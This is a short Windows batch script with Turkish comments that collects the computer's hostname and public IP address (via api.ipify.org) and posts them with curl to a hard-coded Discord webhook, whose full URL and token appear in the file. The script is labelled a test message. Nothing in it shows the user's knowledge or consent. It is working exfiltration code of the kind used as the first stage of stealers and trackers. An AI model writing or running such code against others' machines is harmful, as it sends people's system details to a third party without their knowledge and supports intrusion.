@echo off
set "WEBHOOK=https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-ERE-c-JTWzOWl1U_bYZuVZ5yYCcqKAcCoPw6FqQi7S_MxrP7LMA1f-0"

:: 1. Bilgi Toplama
for /f "tokens=*" %%a in ('hostname') do set "HOST=%%a"
for /f "tokens=*" %%b in ('curl -s https://api.ipify.org') do set "IP=%%b"

:: 2. Discord'a Mesaj Gönder
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"✅ Test mesaji! Bilgisayar: %HOST% | IP: %IP%\"}" "%WEBHOOK%"

pause
